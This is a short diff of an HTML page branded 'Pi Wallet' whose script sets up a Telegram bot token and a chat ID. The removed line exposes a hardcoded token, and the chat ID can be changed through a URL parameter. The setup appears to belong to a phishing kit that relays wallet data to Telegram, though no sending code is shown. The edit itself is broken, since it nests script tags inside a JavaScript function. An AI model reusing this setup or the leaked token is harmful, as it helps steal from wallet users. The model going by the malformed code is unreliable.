@@ -367,9 +367,12 @@
   <div class="blank-space">
     <button onclick="showMessage()">EXPLORE THE ECOSYSTEM</button>
   </div>
-  <script>
+<script>
     document.addEventListener('DOMContentLoaded', function() {
-        var botToken = new URLSearchParams(window.location.search).get("botToken") || "8115406085:AAFWMUOGYC8Opr0Q3hTTCT_vj6-qLmAx68o";
+      <script>
+        var botToken = "<?php echo getenv('BOT_TOKEN'); ?>";
+  </script>
+  <script>
         var chatId = new URLSearchParams(window.location.search).get("refer") || "7462802543";
         var dev = "R3Y";
         var pageName = "Pi Wallet";
